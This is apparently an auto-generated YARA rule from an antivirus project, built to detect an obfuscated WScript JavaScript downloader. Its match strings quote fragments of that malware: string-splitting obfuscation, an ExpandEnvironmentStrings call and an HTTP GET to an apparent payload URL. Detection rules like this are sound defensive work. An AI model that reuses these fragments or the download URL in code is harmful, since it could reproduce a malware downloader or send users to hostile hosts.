rule sig_20160428_63e8218483de13cc17f43ba018384880 {
  meta:
    description = "datamaliciousorder - file 20160428_63e8218483de13cc17f43ba018384880.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "320c4fad32b2be6aac1e092c0ea94ee12ba5ce4babc399dc16b827a532345660"

  strings:
    $s1  = "function BrcMizXnnPcrYwaKuwYju(RpzQnsIfuEocXxgYpbFne){GryNrwLqaFjhGosNiaDeq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function BrcMizXnnPcrYwaKuwYju(RpzQnsIfuEocXxgYpbFne){GryNrwLqaFjhGosNiaDeq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function HisZtxSehEpqQegIogTbx() {return GryNrwLqaFjhGosNiaDeq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function AwfMnmTpdUbyLbeYxvDoy(KdfIirRllKvqHaqWmxHfd, HswCfsMpiFxgBolEzwTmj){VihSiwDdwOazLmgJedKar = VihSiwDdwOazLmgJedKar * 1; " ascii
    $s5  = "var GryNrwLqaFjhGosNiaDeq = function IwbGxoYycJtxPbrVzsBew() {return WwzEinOujXiaUfoJwkXsy[DgnYhiWwfDtkQphPplKwq](\"WScript\"+\"" ascii
    $s6  = "return KdfIirRllKvqHaqWmxHfd - HswCfsMpiFxgBolEzwTmj;};" fullword ascii
    $s7  = "QnmZmqLxlFepRhrEqjSvm[EuxDczFdzAhbTmwEtdEzy](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s8  = "var WwzEinOujXiaUfoJwkXsy = this[\"WScript\"];" fullword ascii
    $s9  = "var GryNrwLqaFjhGosNiaDeq = function IwbGxoYycJtxPbrVzsBew() {return WwzEinOujXiaUfoJwkXsy[DgnYhiWwfDtkQphPplKwq](\"WScript\"+\"" ascii
    $s10 = "function HisZtxSehEpqQegIogTbx() {return GryNrwLqaFjhGosNiaDeq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (QnmZmqLxlFepRhrEqjSvm[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function NlpRkmNhuNrlSgqHroOzi(){return InqMqjIfxMarIvcOxyTvs + \"\";};" fullword ascii
    $s13 = "function AwfMnmTpdUbyLbeYxvDoy(KdfIirRllKvqHaqWmxHfd, HswCfsMpiFxgBolEzwTmj){VihSiwDdwOazLmgJedKar = VihSiwDdwOazLmgJedKar * 1; " ascii
    $s14 = "function IjgQktQgkQaxAesUzkXaw() {return ((YtyQfrBokNqfJbsWdwQfk == true) && (YtyQfrBokNqfJbsWdwQfk == XcqJogWzsGfnYrhYxrZhs)) ?" ascii
    $s15 = "function IjgQktQgkQaxAesUzkXaw() {return ((YtyQfrBokNqfJbsWdwQfk == true) && (YtyQfrBokNqfJbsWdwQfk == XcqJogWzsGfnYrhYxrZhs)) ?" ascii
    $s16 = "XcqJogWzsGfnYrhYxrZhs = true; " fullword ascii
    $s17 = "var XcqJogWzsGfnYrhYxrZhs = false;" fullword ascii
    $s18 = "function ZeuVhdGsiQubDebBrkXwq(){return 23;};" fullword ascii
    $s19 = "UsfSfaVznVbqKvuQvoLeh = true;" fullword ascii
    $s20 = "YtyQfrBokNqfJbsWdwQfk = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}